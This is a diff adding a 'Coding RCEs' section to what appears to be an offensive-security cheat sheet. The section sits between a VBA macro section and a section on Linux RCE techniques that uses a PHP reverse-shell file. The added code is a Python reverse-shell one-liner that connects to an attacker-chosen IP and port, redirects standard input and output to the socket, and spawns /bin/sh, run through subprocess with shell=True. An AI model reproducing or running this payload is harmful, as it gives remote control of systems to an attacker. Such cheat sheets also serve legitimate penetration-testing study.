@@ -1600,6 +1600,19 @@ Sub MyMacro()
 
 End Sub
 ````
+### Coding RCEs
+````
+import subprocess
+
+# Replace "<your $IP" and "<your $PORT>" with your target IP address and port
+reverse_shell_command = 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<your $IP>',<your $PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"'
+
+try:
+    # Execute the reverse shell command
+    subprocess.run(reverse_shell_command, shell=True)
+except Exception as e:
+    print(f"An error occurred: {e}")
+````
 ### Linux rce techniques
 ````
 cp /usr/share/webshells/php/php-reverse-shell.php .
